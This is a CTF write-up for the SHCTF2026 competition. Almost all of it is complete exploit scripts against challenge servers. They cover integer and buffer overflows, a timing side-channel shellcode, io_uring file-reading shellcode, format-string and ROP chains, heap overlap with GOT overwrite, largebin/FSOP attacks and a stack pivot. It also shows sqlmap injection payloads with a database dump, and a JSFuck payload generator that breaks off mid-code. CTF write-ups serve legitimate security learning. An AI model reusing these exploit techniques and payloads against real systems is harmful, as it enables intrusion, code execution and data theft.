# SHCTF2026
## Pwn
### int_overflow

整数溢出进入后门， 缓冲区溢出修改cmd为binsh


```python
from pwn import *
context.binary = binary = ELF('./083747_task', checksec=False)

REMOTE = 1
HOST = 'challenge.shc.tf'
PORT = 30433

if REMOTE:
    r = remote(HOST, PORT)
else:
    r = process(binary.path)


r.sendlineafter(b"number1", b"-78")
r.sendlineafter(b"number2", b"-78")

padding = b"A" * 10
cmd = b"/bin/sh\x00"

payload = padding + cmd

r.sendafter(b"what is your name", payload)
r.interactive()
```


### execve?orw?
ban了除了exit以外的syscall， 打测信道
```python
from pwn import *
import time

context.arch = 'amd64'
context.log_level = 'info'

def get_conn():
    # return process('./pwn') 
    return remote('challenge.shc.tf', 30515) 

binary_path = './pwn'
flag_addr = 0x11451000

flag = ""

for i in range(5, 50):
    found = False
    
    # 遍历可见字符
    for char_code in range(32, 127): 
        log.info(f"Trying character {i}: {chr(char_code)}")
        log.info(f"Current flag: {flag}")
        # Shellcode 逻辑：
        # 1. 比较 flag[i] 和 猜测字符
        # 2. 相等 -> 死循环 (服务器不回包，连接保持)
        # 3. 不等 -> exit (服务器发送 FIN，连接关闭)
        assembly = f"""
            mov rbx, {flag_addr}
            add rbx, {i}
            mov al, byte ptr [rbx]
            cmp al, {char_code}
            je hang
            
            /* 错误则退出 (触发 EOF) */
            mov rax, 60
            xor rdi, rdi
            syscall
            
            hang:
            jmp hang
        """
        
        p = None
        try:
            p = get_conn()
            
            p.sendafter(b"execve? orw?", asm(assembly))
            
            start_time = time.time()
            
            try:
                p.recvline(timeout=1)
                flag += chr(char_code)
                log.info(f"Found: {flag}")
                found = True
                p.close()
                break
            except Exception:
                p.close()
                
        except Exception as e:
            if p: p.close()

    if not found:
        log.warning("\n[!] Character not found or end of flag.")
        break

    if flag.endswith('}'):
        log.success("\n[+] Full flag captured!")
        break
```

### **execve?orw?_revenge**

刚开始题坏了， 后来修好以后一血被抢了， 拿了个二血。

[Io_uring - J4f's blog](https://shlomojune.github.io/posts/io_uring/#模板)

直接copy板子秒了。

```python
from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context(arch='amd64', os='linux', log_level='debug')

"""
    rsp+0x100   0x078: struct io_uring_params params = {};
    rsp+0x200   0x008: uring_fd
    rsp+0x208   0x008: sq_ring ptr
    rsp+0x210   0x008: cq_ring ptr
    rsp+0x218   0x008: sqes ptr
    rsp+0x220   0x008: flag_fd
    rsp+0x300   0x100: buffer
"""
shellcode = asm("""
/*视情况调整栈帧*/
    mov rsp, rbp
    sub rsp, 0x10000
/*int uring_fd = syscall(SYS_io_uring_setup, 16, &params);*/
    mov rax, 0
    lea rdi, [rsp+0x100]
    mov rcx, 15
    rep stosq
    mov rdi, 16
    lea rsi, [rsp+0x100]
    mov rax, 0x1a9
    syscall
/*unsigned char *sq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQ_RING);*/
    mov qword ptr [rsp+0x200], rax
    xor rdi, rdi
    mov rsi, 0x1000
    mov rdx, 3
    mov r10, 1
    mov r8, qword ptr [rsp+0x200]
    mov r9, 0
    mov rax, 9
    syscall
    mov qword ptr [rsp+0x208], rax
/*unsigned char *cq_ring = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_CQ_RING);*/
    xor rdi, rdi
    mov rsi, 0x1000
    mov rdx, 3
    mov r10, 1
    mov r8, qword ptr [rsp+0x200]
    mov r9, 0x8000000
    mov rax, 9
    syscall
    mov qword ptr [rsp+0x210], rax
/*struct io_uring_sqe *sqes = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQES);*/
    xor rdi, rdi
    mov rsi, 0x1000
    mov rdx, 3
    mov r10, 1
    mov r8, qword ptr [rsp+0x200]
    mov r9, 0x10000000
    mov rax, 9
    syscall
    mov qword ptr [rsp+0x218], rax

/*openat*/
    mov rax, 0
    mov rdi, qword ptr [rsp+0x218]
    mov rcx, 8
    rep stosq
    mov rdi, qword ptr [rsp+0x218]
    mov byte ptr [rdi], 18 	/*opcode*/
    mov byte ptr [rdi+1], 0	/* IOSQE_ flags*/
    mov dword ptr [rdi+4], -100	/* file descriptor to do IO on */
    /* 要打开文件的路径存放在 rsp+0x300 处 */
    mov rax, 0x67616c662f
    mov qword ptr [rsp+0x300], rax
    lea rax, [rsp+0x300]
    mov qword ptr [rdi+16], rax /*pathname*/
    mov dword ptr [rdi+28], 0	/*open_flag*/

    mov rdi, qword ptr [rsp+0x208]
    mov edx, dword ptr [rsp+0x140]
    add rdi, rdx
    mov dword ptr [rdi], 0

    mov rdi, qword ptr [rsp+0x208]
    mov edx, dword ptr [rsp+0x12c]
    add rdi, rdx
    add dword ptr [rdi], 1

    mov rdi, qword ptr [rsp+0x200]
    mov rsi, 1
    mov rdx, 1
    mov r10, 1
    xor r8, r8
    xor r9, r9
    mov rax, 0x1aa
    syscall

    mov rdi, qword ptr [rsp+0x210]
    mov edx, dword ptr [rsp+0x164]
    add rdi, rdx
    mov edx, dword ptr [rdi+8]
    mov qword ptr [rsp+0x220], rdx

 /*read*/
    mov rax, 0
    mov rdi, qword ptr [rsp+0x218]
    mov rcx, 8
    rep stosq
    mov rdi, qword ptr [rsp+0x218]
    mov byte ptr [rdi], 22
    mov rax, qword ptr [rsp+0x220]
    mov dword ptr [rdi+4], eax
    lea rax, [rsp+0x300]
    mov qword ptr [rdi+16], rax
    mov dword ptr [rdi+24], 0x100

    mov rdi, qword ptr [rsp+0x208]
    mov edx, dword ptr [rsp+0x140]
    add rdi, rdx
    mov dword ptr [rdi], 0

    mov rdi, qword ptr [rsp+0x208]
    mov edx, dword ptr [rsp+0x12c]
    add rdi, rdx
    add dword ptr [rdi], 1

    mov rdi, qword ptr [rsp+0x200]
    mov rsi, 1
    mov rdx, 1
    mov r10, 1
    xor r8, r8
    xor r9, r9
    mov rax, 0x1aa
    syscall

/*write*/
    mov rax, 0
    mov rdi, qword ptr [rsp+0x218]
    mov rcx, 8
    rep stosq
    mov rdi, qword ptr [rsp+0x218]
    mov byte ptr [rdi], 23
    mov dword ptr [rdi+4], 1
    lea rax, [rsp+0x300]
    mov qword ptr [rdi+16], rax
    mov dword ptr [rdi+24], 0x100

    mov rdi, qword ptr [rsp+0x208]
    mov edx, dword ptr [rsp+0x140]
    add rdi, rdx
    mov dword ptr [rdi], 0

    mov rdi, qword ptr [rsp+0x208]
    mov edx, dword ptr [rsp+0x12c]
    add rdi, rdx
    add dword ptr [rdi], 1

    mov rdi, qword ptr [rsp+0x200]
    mov rsi, 1
    mov rdx, 3
    mov r10, 1
    xor r8, r8
    xor r9, r9
    mov rax, 0x1aa
    syscall
""")

if args.LOCAL:
    p = process('./pwn')
else:
    p = remote('extra-challenge.shc.tf', 30708)



p.recvuntil(b'execve? orw?')
sleep(0.1)
p.sendline(shellcode)

# sleep(1)
# print(p.recv(timeout=10))
p.interactive()

```



### baby_fmt

leak libc和stack， 构造ROP， 写printf返回地址
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*
import re
import os
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']
local = 0
ip = "challenge.shc.tf"
port = 32027
ELF_PATH="./pwn"
if local:
    p = process(ELF_PATH)
else:
    p = remote(ip,port)
elf = ELF(ELF_PATH)
libc = ELF("./libc.so.6")

sla = lambda x,s : p.sendlineafter(x,s)
sl = lambda s : p.sendline(s)
sa = lambda x,s : p.sendafter(x,s)
s = lambda s : p.send(s)
r = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x, drop=True)

def dbg():
    script = '''
brva 0x126B
    '''
    if local:
        gdb.attach(p,script)
    pause()

def lg(buf):
    log.success(f'\033[33m{buf}:{eval(buf):#x}\033[0m')


fmt = b'%61$p-%62$p-'


sla(b'Input your text: ', fmt)
p.recvuntil(b'text:')
libc_base = int(p.recvuntil(b'-', drop=True), 16)-0x29e40
lg('libc_base')
stack_addr = int(p.recvuntil(b'-', drop=True), 16)
lg('stack_addr')

pop_rdi = libc_base + 0x00000000001b7866
ret = pop_rdi + 1
pop_rsi = libc_base + 0x000000000017557a
pop_rdx_rbx = libc_base + 0x0000000000174e76
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))
system = libc_base + libc.sym['system']
leave_ret = libc_base + 0x000000000004da83


def write(addr, value):
    fmt = fmtstr_payload(7, {addr : value}, numbwritten=8)
    sla(b'Input your text: ', b'aaa' + fmt)


# write rbp
write(stack_addr-0x128, stack_addr)

ret_addr = stack_addr - 0x120
# construct ROP chain
# write(ret_addr, 0xdeadbeef)
write(ret_addr, pop_rdi)
write(ret_addr+8, binsh)
write(ret_addr+16, ret)
write(ret_addr+24, system)

# dbg()

target = stack_addr - 0x240 # printf ret addr
write(target, leave_ret)
p.interactive()
```


### Linklist
堆溢出， 构造重叠堆块， 篡改全局指针， 改free_got为onegadget
```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']
local = 0

elf = ELF('./vuln')
libc = ELF('./libc-2.31.so')



if local:
    p = process('./vuln')
else:
    p = remote('challenge.shc.tf', 32198)

def dbg():
    script = '''
disp/x *0x4040B0
b *0x40138B
    '''
    if local:
        gdb.attach(p,script)
    pause()

def lg(buf):
    log.success(f'\033[33m{buf}:{eval(buf):#x}\033[0m')


def add(size, content):
    p.sendlineafter(b'choice?\n', b'1')
    p.sendlineafter(b'size?\n', str(size).encode())
    p.sendafter(b'content?\n', content)

def delete():
    p.sendlineafter(b'choice?\n', b'2')

def show():
    p.sendlineafter(b'choice?\n', b'3')

def edit(content):
    p.sendlineafter(b'choice?\n', b'4')
    p.sendafter(b'content?\n', content)

add(0x18, b'a'*0x18)
add(0x18, b'b'*0x18)
add(0x18, b'c'*0x18)
add(0x18, b'd'*0x18)

delete()
delete()
delete()

payload = b'A' * 24 + p64(0x41)
edit(payload)

add(0x18, b'e'*0x18)

delete()

add(0x38, b'h'*0x18 + p64(0x21) + p64(0x4040B0) + p64(0xcafebabe))

# edit(p64(0x4040B0 + 8) + p64(elf.got['free']))
edit(p64(0x4040B0 + 8) + p64(0x4040B0 - 0x10))
edit(p64(elf.got['free']) + p64(0) + p64(0x4040B0 - 0x10) + b'/bin/sh\x00')

show()

p.recvuntil(b'content: ')
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - libc.sym['free']
lg('libc_base')

system = libc_base + libc.sym['system']
edit(p64(libc_base + 0xe3b01))
# dbg()


delete()
p.interactive()


```

### cpp_canary
覆盖rbp和retaddr进行栈迁移， 输入0字节触发异常处理绕过canary。
```python
from pwn import *

context.binary = './pwn'
context.arch = 'amd64'
context.log_level = 'info'


backdoor_addr = 0x4025DB
user_addr = 0x406320         
target_stack = user_addr + 0x10 
fake_rbp = target_stack - 8
main_ret = 0x4028E6           

p = remote('challenge.shc.tf', 32377) 

p.sendafter(b"username: ", p64(backdoor_addr))


payload = flat({
    0: b'A' * 64,
    64: p64(fake_rbp),
    72: p64(main_ret)
})
p.sendafter(b"password: ", payload)


p.sendafter(b"key: ", b"\x00")

p.interactive()
```

### hello rust
整数溢出触发panic通过is_poisoned()判定进入Secret Menu获取堆地址和system地址。edit_name堆溢出修改vtable执行system("/bin/sh")
```python
from pwn import *

# Set up context
binary = './pwn'
elf = ELF(binary)
context.binary = binary
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

def start():
    if args.REMOTE:
        return remote('challenge.shc.tf', 30264) 
    else:
        return process(binary)



io = start()

def dbg():
    script = '''

    '''
    gdb.attach(io,script)
    pause()

def work():
    io.sendlineafter(b'> ', b'1')

def shop(idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b': ', str(idx).encode())

def edit_name(payload):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b': ', payload)

def manifesto():
    io.sendlineafter(b'> ', b'4')

def exploit():
    shop(256)

    for _ in range(150):
        work()

    shop(5)
    io.recvuntil(b': 0x')
    leak_x = int(io.recvline().strip(), 16)
    log.info(f"Leaked &x: {hex(leak_x)}")
    
    system_plt = leak_x

    shop(3)
    io.recvuntil(b': 0x')
    heap_name = int(io.recvline().strip(), 16)
    log.success(f"Heap Name Address: {hex(heap_name)}")
    
    payload = flat(
        b"/bin/sh\0",     
        b"A" * 16,           
        p64(system_plt),     
        b"B" * 4,               
        p64(heap_name),        
        p64(heap_name)          
    )
    
    edit_name(payload)
    manifesto()
    
    io.interactive()

if __name__ == '__main__':
    exploit()
```
### baby_canary
```python
from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
# Context Setup
context.log_level = 'debug'
context.binary = elf = ELF('./pwn')

local = 0
libc = ELF('./libc.so.6')

if local:
    p = process('./pwn')
else:
    p = remote('challenge.shc.tf', 30899)

def dbg():
    script = '''
    '''
    if local:
        gdb.attach(p,script)
    pause()

def lg(buf):
    log.success(f'\033[33m{buf}:{eval(buf):#x}\033[0m')

# --- Addresses & Constants ---
unk_4040C0 = 0x4040C0           # Base address for arbitrary write
got_stack_chk = elf.got['__stack_chk_fail']
got_puts = elf.got['puts']
plt_puts = elf.plt['puts']
addr_main = 0x40154B
addr_start = 0x401130
addr_loop_var = 0x404068        # dword_404068


leave_ret = 0x401549
ret_gadget = 0x401016
pop_rax = 0x4013C9
gadget1 = 0x00000000004011fc


def write_primitive(p, idx, val):
    # Send index (padded to 9 bytes)
    p.send(str(idx).encode().ljust(9, b'\x00'))
    time.sleep(0.05)
    # Send value
    p.send(p64(val))
    # Handle continuation
    p.recvuntil(b'more?\n')
    p.send(b'y')



idx_stack = (got_stack_chk - unk_4040C0) // 8
idx_loop  = (addr_loop_var - unk_4040C0) // 8
idx_exit  = (elf.got['exit'] - unk_4040C0) // 8

p.recvuntil(b'baby canary!\n')
log.info("Phase 1: Disable Canary & Leak Libc")

# 1. Overwrite __stack_chk_fail with 'ret'
write_primitive(p, idx_stack, ret_gadget)

write_primitive(p, idx_loop, 1)

# Exit loop
p.send(b'0'.ljust(9, b'\x00')) # Dummy index
p.send(p64(0))                 # Dummy value
p.recvuntil(b'more?\n')
p.send(b'n')

# 4. Trigger Pivot
p.recvuntil(b'hack me\n')
# Payload: Padding(24) + Canary(8) + Saved RBP(unk_4040C0) + Ret(leave; ret)
payload = p64(pop_rax) + p64(elf.got['puts']) + p64(0x40149B) + p64(addr_main)*2



p.send(payload)

libc_base = u64(p.recv(6).ljust(8, b'\x00')) - libc.sym['puts']
lg('libc_base')


p.sendline(b'y')

pop_rdi = libc_base + 0x000000000002a3e5
pop_rsi = libc_base + 0x000000000002be51
pop_rdx_rbx = libc_base + 0x00000000000904a9
open_addr = libc_base + libc.sym['open']

p.send(b'aa')

p.send(p64(0))   

p.recvuntil(b'more?\n')

p.send(b'n')
p.recvuntil(b'ok,try to hack me\n')


bss = 0x404500
read_addr = libc_base + libc.sym['read']


payload = p64(pop_rsi) + p64(bss) + p64(read_addr) + p64(leave_ret) + p64(bss) + p64(leave_ret)
p.send(payload)

pause()

payload = b''
payload += p64(bss)
payload += p64(pop_rdx_rbx) + p64(0x500) + p64(0) + p64(read_addr)



p.send(payload)


pause()
mprotect_addr = libc_base + libc.sym['mprotect']
payload = b''
payload += b'a'*0x28
payload += p64(pop_rdi) + p64(bss & 0xfffffffffffff000)
payload += p64(pop_rsi) + p64(0x1000)
payload += p64(pop_rdx_rbx) + p64(7) + p64(0) + p64(mprotect_addr)
payload += p64(bss + 0x300)
payload = payload.ljust(0x300, b'\x00')

shellcode = shellcraft.openat('0', bss+0x400, 0)
shellcode += shellcraft.read('rax', bss+0x200, 0x500)
shellcode += shellcraft.write(1, bss+0x200, 0x500)
payload += asm(shellcode)
payload = payload.ljust(0x400, b'\x00')

payload += b'/flag\x00'
payload = payload.ljust(0x500, b'\x00')

# dbg()
p.send(payload)

p.interactive()


```

### fmt_blind
```c
void __fastcall sub_110D(__int64 p_format)
{
  dup2(0, 2);
  close(1);
  open("/dev/null", 1);
  dup(1);
}
flag在栈上， 把stdout闭了， 但是stderr还在。第一次输入leak libc， 第二次输入有格式化字符串， 把stdout的fileno从1改成2， 这样printf的输出就转到stderr中了， 然后用%p把栈上的flag打印出来。
```
```python
from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
# Context Setup
context.log_level = 'info'
context.binary = elf = ELF('./pwn')

local = 0
libc = ELF('./libc.so.6')

if local:
    p = process('./pwn')
else:
    p = remote('challenge.shc.tf', 32070)

def dbg():
    script = '''
    brva 0x133D
    brva 0x1378
    '''
    if local:
        gdb.attach(p,script)
    pause()

def lg(buf):
    log.success(f'\033[33m{buf}:{eval(buf):#x}\033[0m')

p.sendlineafter(b'Input your name size: ', b'128')


p.sendlineafter(b'Input your name: ', b'a'*88 + b'b'*8 + b'c'*8)
p.recvuntil(b'c'*8)
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - 0x20840
lg('libc_base')

fileno = libc_base + 0x3c5620 + 0x70
lg('fileno')


# dbg()
fmt = b'%2c%21$hhn%15$pPPPPPPPPP' + p64(fileno)
# fmt = b'%10$paaaaaa'

p.sendlineafter(b'change your name.', fmt)
data = p.recvuntil(b'PPPPPPPPP')
log.info(f'data: {data}')
p.interactive()

# 0x27697b4654434853
# 0x49622037304e204d 
# 0x377320315f444e49
# 0x6556616820314969
# 0x7d72726544543520

# SHCTF{i'M N07 bIIND_1 s7iI1 haVe 5TDerr}


```
### Large Manager
2.35 largebin attack， 改 IO_list_all打house of板子。
```python
from pwn import *

# Set up context
exe = './power'
elf = ELF(exe)
# libc = ELF('./libc.so.6') # Ensure you have the correct libc
context.binary = exe
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
libc = ELF('./libc.so.6')

def dbg():
    script = '''

    b _IO_flush_all_lockp
    b _IO_wfile_overflow
    b _IO_wfile_underflow_maybe_mmap

    '''
    gdb.attach(io, script)
    pause()


OFFSET_MAIN_ARENA = 0x21b0b0 
OFFSET_IO_LIST_ALL = libc.symbols['_IO_list_all']
OFFSET_SYSTEM = libc.symbols['system']
OFFSET_IO_WFILE_JUMPS = libc.symbols['_IO_wfile_jumps']

def lg(buf):
    log.success(f'\033[33m{buf}:{eval(buf):#x}\033[0m')

def start():
    if args.REMOTE:
        return remote('challenge.shc.tf', 31148)
    return process(exe)

io = start()

def add(idx, size, content):
    io.sendlineafter(b'choice: ', b'1')
    io.sendlineafter(b'Enter the size of the record: ', str(size).encode())
    io.sendlineafter(b'Enter the index of the record: ', str(idx).encode())
    if len(content) < size:
        content = content.ljust(size, b'\x00')
    io.sendafter(b'Enter the content of the record: ', content)

def view(idx):
    io.sendlineafter(b'choice: ', b'2')
    io.sendlineafter(b'Enter the index of the record: ', str(idx).encode())
    return io.recvuntil(b'\n1. Add', drop=True)

def delete(idx):
    io.sendlineafter(b'choice: ', b'3')
    io.sendlineafter(b'Enter the index of the record: ', str(idx).encode())

def edit(idx, content):
    io.sendlineafter(b'choice: ', b'4')
    io.sendlineafter(b'Enter the index of the record: ', str(idx).encode())
    io.sendafter(b'Enter the content of the record: ', content)

add(0, 0x528, b"A" * 0x520)


add(1, 0x500, b"B" * 8)


add(2, 0x510, b"C" * 8)

delete(0)


add(3, 0x560, b"D" * 8)




leak_data = view(0)

leak_fd = u64(leak_data[:8])
leak_heap = u64(leak_data[16:24])

libc_base = leak_fd - 96 - OFFSET_MAIN_ARENA
heap_base = leak_heap - 0x290

log.success(f"Libc Base: {hex(libc_base)}")
log.success(f"Heap Base: {hex(heap_base)}")



delete(2)

target = libc_base + OFFSET_IO_LIST_ALL
log.info(f"Target: {hex(target)}")


lock = libc_base + 0x1000
setcontext = libc_base + libc.symbols['setcontext'] + 61
mprotect = libc_base + libc.symbols['mprotect']
_IO_wfile_jumps_maybe_mmap = libc_base + 0x216f40
fake_io_addr = heap_base + 0x290
ret = libc_base + 0x00000000000467c9
rdi = libc_base + 0x000000000002a3e5
rsi = libc_base + 0x000000000002be51
rdx_r12 = libc_base + 0x000000000011f2e7
rax = libc_base + 0x0000000000045eb0

pl =p64(0) + p64(0) + p64(0) + p64(target-0x20)
pl+=p64(0)*2 + p64(0) + p64(fake_io_addr+0x10)
pl+=p64(0)*4
pl+=p64(0)*3 + p64(lock)
pl+=p64(0)*2 + p64(fake_io_addr+0xe0) + p64(0)
pl+=p64(0)*4
pl+=p64(0) + p64(_IO_wfile_jumps_maybe_mmap) 
pl+=p64(setcontext)
pl+=p64(0)*(0x7 + 0x14 - 8) + p64(fake_io_addr + 0x1c8) + p64(ret) + p64(0)*6 + p64(fake_io_addr + 0xe0 - 0x68)

# pl+=p64(rdi) + p64(heap_base >> 12 << 12) + p64(rsi) + p64(0x2000) + p64(rdx_r12) + p64(7)*2 + p64(mprotect)
# pl+= p64(heap_base + 0x7d0)# shellcode_addr

pl+=p64(rdi) + p64(libc_base + next(libc.search(b'/bin/sh'))) + p64(rsi) + p64(0) + p64(rdx_r12) + p64(0)*2 + p64(libc_base + libc.sym['execve'])

edit(0, pl)
add(4, 0x500, b"zmjjrr")

# dbg()
io.sendline(b'5')



io.interactive()
```

### **Earth_Online**

这里是一份简单直接的中文 WriteUp，去掉了多余的废话，保留了核心思路。

---

## Earth Online Pwn WriteUp

NaN 逻辑漏洞绕过检查 + Stack Pivot 劫持控制流。代码里没有 `pop rdi` 

看 `emergency_relief` 函数，这里有个关于救济粮价格的计算：
```c
// v6 是当前拥有的钱的一半
// 如果钱是 0，那么 v6 = 0.0
v1 = money / v6; // 0.0 / 0.0 = NaN
```
当我们的钱（`money`）被花光变成 `0.0` 时，如果去吃救济粮并选择 "Buy All"（选项2），就会触发除以零，导致买到的 `food` 变成 `NaN`。

然后去超市把这些 `NaN` 的食物全卖掉（Sell All），我们的 `money` 也会被感染成 `NaN`。

在 `buy_house` 函数里，有一个关键检查：
```c
v4 = size * 100000000.0;
if ( v4 <= money ) { ... }
```
正常情况下买不起大房子。但因为 `money` 已经是 `NaN` 了，浮点数比较特性中，`NaN` 和任何数比较通常都会让条件判断失效（或者说走向“无序”分支），导致 `v4 <= money` 检查直接通过。

我们可以输入一个巨大的 `size`（比如 512），从而在后面的 `read(0, buf, nbytes)` 触发栈溢出。

有了栈溢出以后利用0x402248开始的一段代码打栈迁移leak libc然后getshell。

```python
from pwn import *

# Context setup
exe = './pwn'
elf = ELF(exe)
context.binary = exe
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

def start():
    return remote('challenge.shc.tf', 32389)
    # return process(exe)


libc = ELF('./libc.so.6')
p = start()

def dbg():
    gdb.attach(p, '''
    ''')
    pause()


p.sendlineafter(b'Choice $', b'1')       
p.sendlineafter(b'Choice $', b'1')      
p.sendlineafter(b'kg) $', b'10')      
p.sendlineafter(b'Choice $', b'5')      


while True:
    p.sendline(b'9') 
    output = p.recv(timeout=0.05)
    if b'Relief Food Market' in output:
        log.success("Emergency Relief Triggered!")
        break

p.sendline(b'2') 

p.sendlineafter(b'Choice $', b'1')      
p.sendlineafter(b'Choice $', b'4')      
p.sendlineafter(b'Choice $', b'5')      


p.sendlineafter(b'Choice $', b'3')      

p.sendlineafter(b'size $', b'512')       


ret = 0x000000000040101a
pop_rsi = 0x000000000040254b
pop_rbp = 0x000000000040138b
bss = 0x406800
leave_ret = 0x0000000000401793
main = 0x40227B

payload = b''
payload += b'A' * 80
payload += p64(0x4060a0 + 0x58)
payload += p64(0x402248)


p.sendafter(b'characters) $', payload)
pause()

payload = b''
payload += b'A' * 0x50
payload += p64(bss)
payload += p64(leave_ret)
payload = payload.ljust(0x758, b'\x00')

payload += p64(bss + 0x100)
payload += p64(pop_rsi)
payload += p64(elf.got['puts'])
payload += p64(0x402264)
payload = payload.ljust(0x800, b'\x00')
payload += p64(0x500)
payload += p64(bss)

payload = payload.ljust(0x858, b'\x00')

payload += p64(0x4068a8 + 0x58)
payload += p64(0x402248)

p.send(payload)
pause()

p.recvuntil(b'Your dream house is ')
p.recvuntil(b'Your dream house is ')
p.recvuntil(b'Your dream house is ')
libc_base = u64(p.recvline().strip().ljust(8, b'\x00')) - libc.symbols['puts']
log.success(f"Leaked libc base: {hex(libc_base)}")

pop_rdi = libc_base + 0x000000000010f78b
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))

payload = b''
payload += b'A' * 0x50
payload += p64(0xdeadbeef)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(system)



# dbg()
p.send(payload)





p.interactive()

# .text:0000000000402248                 mov     rdx, [rbp+nbytes] ; nbytes
# .text:000000000040224C                 lea     rax, [rbp+buf]
# .text:0000000000402250                 mov     rsi, rax        ; buf
# .text:0000000000402253                 mov     edi, 0          ; fd
# .text:0000000000402258                 call    _read
# .text:000000000040225D                 lea     rax, [rbp+buf]
# .text:0000000000402261                 mov     rsi, rax
# .text:0000000000402264                 lea     rax, aYourDreamHouse ; "Your dream house is %s\n"
# .text:000000000040226B                 mov     rdi, rax        ; format
# .text:000000000040226E                 mov     eax, 0
# .text:0000000000402273                 call    _printf
# .text:0000000000402278                 nop
# .text:0000000000402279
# .text:0000000000402279 locret_402279:                          ; CODE XREF: buy_house+22B↑j
# .text:0000000000402279                 leave
# .text:000000000040227A                 retn
```



## Web

### 上古遗迹档案馆
sqlmap
```bash
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 321 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: id=1' RLIKE (SELECT (CASE WHEN (6954=6954) THEN 1 ELSE 0x28 END))-- gWum

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: id=1' AND EXTRACTVALUE(1025,CONCAT(0x5c,0x717a7a7071,(SELECT (ELT(1025=1025,1))),0x7170627071))-- mWBj

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1' AND (SELECT 4480 FROM (SELECT(SLEEP(5)))rlmi)-- USOR
---
```
```bash
python3 sqlmap.py -u "http://challenge.shc.tf:31325/?id=1" --current-db --batch
```
拿到db名字
```bash
current database: 'archive_db'
```
```bash
python3 sqlmap.py -u "http://challenge.shc.tf:31325/?id=1" -D archive_db --tables --batch
```
拿到table名字
```bash
Database: archive_db
[2 tables]
+----------------+
| public_records |
| secret_vault   |
+----------------+
```
dump secret_vault
```bash
python3 sqlmap.py -u "http://challenge.shc.tf:31325/?id=1" -D archive_db -T secret_vault --dump --batch
```
```bash
Database: archive_db
Table: secret_vault
[1 entry]
+----+---------------------------------------------+
| id | secret_key                                  |
+----+---------------------------------------------+
| 1  | SHCTF{5492659a-3950-49eb-b3ce-60b9ec9c4ea0} |
+----+---------------------------------------------+
```

### **calc?js?fuck!**

```python
import requests
import sys

# Change this to your challenge URL
TARGET_URL = "http://challenge.shc.tf:31428/calc"

def generate_payload():
    # Helper to avoid the forbidden character '8'
    def n(num):
        s = str(num)
        if '8' not in s:
            return s
        # Recursively split numbers containing 8 (e.g., 8 -> 4+4, 18 -> 9+9)
        if num == 8: return "(4+4)"
        half = num // 2
        rem = num - half
        return f"({n(half)}+{n(rem)})"

    # Helper to get a character from an expression at a specific index
    def g(expr, idx):
        return f"({expr})[{n(idx)}]"

    # Character map
    chars = {}

    # 1. Primitives
    p_false = "![]+[]"       # "false"
    p_true = "!![]+[]"       # "true"
    p_undef = "[][[]]+[]"    # "undefined"
    p_inf = "+(1/0)+[]"      # "Infinity"
    p_nan = "+[![]]+[]"      # "NaN"

    # Extract chars from primitives
    # false
    chars['f'] = g(p_false, 0)
    chars['a'] = g(p_false, 1)
    chars['l'] = g(p_false, 2)
    chars['s'] = g(p_false, 3)
    chars['e'] = g(p_false, 4)
    # true
    chars['t'] = g(p_true, 0)
    chars['r'] = g(p_true, 1)
    chars['u'] = g(p_true, 2)
    # undefined
    chars['n'] = g(p_undef, 1)
    chars['d'] = g(p_undef, 2)
    chars['i'] = g(p_undef, 5)
    # Infinity
    chars['I'] = g(p_inf, 0)
    chars['y'] = g(p_inf, 7)
    
    # Numbers 0-9
    for i in range(10):
        chars[str(i)] = f"({n(i)}+[])"
    
    # Dot (.)
    chars['.'] = g("1.1+[]", 1)

    # Helper to build strings from known chars
    def build_str(s):
        return "+".join([chars[c] for c in s])

    # 2. Get "filter" string -> "function filter() { [native code] }"
    str_filter = build_str("filter")
    fn_str = f"([][{str_filter}]+[])"

    chars['c'] = g(fn_str, 3)
    chars['o'] = g(fn_str, 6)
    chars[' '] = g(fn_str, 8)
    chars['('] = g(fn_str, 15)
    chars[')'] = g(fn_str, 16)
    chars['{'] = g(fn_str, 18)
    chars['['] = g(fn_str, 20)

    # 3. Get Constructor
    str_constr = build_str("constructor")
    
    # Function Constructor: []["filter"]["constructor"]
    FN = f"[][{str_filter}][{str_constr}]"

    # String Constructor: ([]+[])["constructor"] -> "function String() ..."
    str_S_cons = f"([]+[])[{str_constr}]+[]"
    chars['S'] = g(str_S_cons, 9)
    chars['g'] = g(str_S_cons, 14)

    # 4. Generate a-z using base 36
    str_toString = build_str("toString")
    for i in range(10, 36):
        char = "abcdefghijklmnopqrstuvwxyz"[i-10]
        if char not in chars:
            chars[char] = f"({n(i)})[{str_toString}]({n(36)})"

    # 5. Generate escape/unescape for special chars
    str_return = build_str("return")
    str_escape = build_str("escape")
    str_unescape = build_str("unescape")

    # Define unescape function: Function("return unescape")()
    # Since we can't use variables, we reconstruct this expression when needed
    unesc_fn = f"{FN}({str_return}+{chars[' ']}+{str_unescape})()"
